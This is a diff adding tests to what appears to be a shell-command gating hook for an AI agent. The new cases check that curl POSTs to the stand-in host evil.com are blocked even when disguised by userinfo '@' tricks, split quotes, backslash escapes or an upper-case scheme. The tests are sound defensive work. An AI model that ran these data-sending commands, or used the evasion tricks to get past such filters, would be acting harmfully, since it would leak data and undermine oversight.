@@ -297,6 +297,26 @@ for c in 'curl -d x "http://example.com"' 'curl -d x "http://localhost.evil.com"
   assert_rc 2 "$c blocked"
 done
 
+# A URL's host follows its userinfo (#149).
+run_hook "$S" "$(jsonin 'curl -d x http://localhost:3000@evil.com')"
+assert_rc 2 "an HTTP write past a local name before an @ blocked"
+run_hook "$S" "$(jsonin 'curl -d x http://user:pass@localhost:3000/api')"
+assert_rc 0 "an HTTP write with credentials to a local host allowed"
+assert_eq "$OUT" "" "an HTTP write with credentials to a local host asks nothing"
+
+# The shell drops a word's quotes before curl reads it (#148).
+for c in "curl -d x 'evil.com'" 'curl -d x "http://e"vil.com/x' 'curl -d x http://e\vil.com'; do
+  run_hook "$S" "$(jsonin "$c")"
+  assert_rc 2 "$c blocked"
+done
+run_hook "$S" "$(jsonin 'curl -d x "http://localhost:3000/api/v1/projects/123/items?include=details&sort=desc"')"
+assert_rc 0 "a long quoted local URL allowed"
+assert_eq "$OUT" "" "a long quoted local URL asks nothing"
+
+# curl reads a URL's scheme in any case.
+run_hook "$S" "$(jsonin 'curl -d x HTTP://evil.com')"
+assert_rc 2 "an HTTP write with an upper-case scheme blocked"
+
 # A verb read from one piece of a quoted argument asks, and the question names the piece (#131).
 for c in 'claude "review this"' "x host 'npm publish'"; do
   run_hook "$S" "$(jsonin "$c")"
